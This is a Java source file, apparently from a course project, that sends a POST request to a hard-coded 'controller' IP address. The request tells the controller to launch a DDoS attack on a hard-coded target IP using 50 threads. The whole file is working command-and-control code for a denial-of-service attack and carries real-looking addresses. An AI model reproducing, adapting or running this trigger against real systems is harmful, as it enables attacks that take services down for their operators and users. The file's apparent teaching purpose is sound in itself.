package cs585.DdosAttackTrigger;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;

public class TriggerDdosAttack {

	public static void main(String[] args) throws IOException{
	// TODO Auto-generated method stub
	
		String controllerAddr = "35.164.62.241";  // Controller IP address

		String targetAddr = "35.165.47.156";
		int numThreadsUsedToAttack = 50;
		
		URL url = new URL("http://" + controllerAddr + ":8080/trigger/?targetAddress=" 
		+ targetAddr + "&numberOfThreads=" + numThreadsUsedToAttack);	
		
		sendTriggerPOSTRequest(url);
	}
	
	public static void sendTriggerPOSTRequest(URL postAddress) {
		
		try {
			HttpURLConnection httpCon = (HttpURLConnection) postAddress.openConnection();
			httpCon.setDoOutput(true);
			httpCon.setRequestMethod("POST");
			OutputStreamWriter out = new OutputStreamWriter(httpCon.getOutputStream());
			System.out.println(httpCon.getResponseCode() + httpCon.getResponseMessage() 
												+ "Trigger sent to Controller");

			out.close();
		} catch (ProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}				
	}
}